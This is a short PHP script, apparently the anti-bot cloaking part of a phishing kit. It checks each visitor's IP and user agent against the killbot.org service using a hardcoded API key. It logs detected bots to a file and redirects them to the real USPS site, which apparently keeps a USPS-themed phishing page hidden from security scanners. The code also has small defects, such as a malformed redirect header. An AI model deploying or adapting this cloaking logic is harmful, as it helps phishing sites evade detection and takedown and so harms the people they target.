<?php
$config_antibot = 'R8nIqy2yVeeqMWCt8lDa_bOP2wAd1HL84hNfWqVB68AlB';
function getUserIPszz(){
	$client  = @$_SERVER['HTTP_CLIENT_IP'];
	$forward = @$_SERVER['HTTP_X_FORWARDED_FOR'];
	$remote  = $_SERVER['REMOTE_ADDR'];
	if(filter_var($client, FILTER_VALIDATE_IP)){
		$ip = $client;
	}
	elseif(filter_var($forward, FILTER_VALIDATE_IP)){
		$ip = $forward;
	}
	else{
		$ip = $remote;
	}
	return $ip;
}
$ip = getUserIPszz();
if(isset($config_antibot)) {
	if(!isset($_SESSION['antibot_wasChecked']) or $_SESSION['antibot_wasChecked'] == false){
		$ch = curl_init();
		curl_setopt($ch, CURLOPT_USERAGENT, "Antibot Blocker");
		curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
		curl_setopt($ch, CURLOPT_URL, "https://killbot.org/api/v1/blocker?ip={$ip}&apikey={$config_antibot}&ua=".urlencode($_SERVER['HTTP_USER_AGENT']));
		$data = curl_exec($ch);
		curl_close($ch);
		$_SESSION['antibot_wasChecked'] = true;
		$x = json_decode($data, true);
		if($x['data']['is_bot']){
			$_SESSION['is_bot']  = true;
		}
		else{
			$_SESSION['is_bot']  = false;
		}
	}
}
else{
	$_SESSION['is_bot'] = false;
}

if($_SESSION['is_bot'] == true){
	$file = fopen("antibot-block.txt","a");
	$message = $ip."\n";
	fwrite($file, $message);
	fclose($file);
	header("Location : https://usps.com");
	die();
}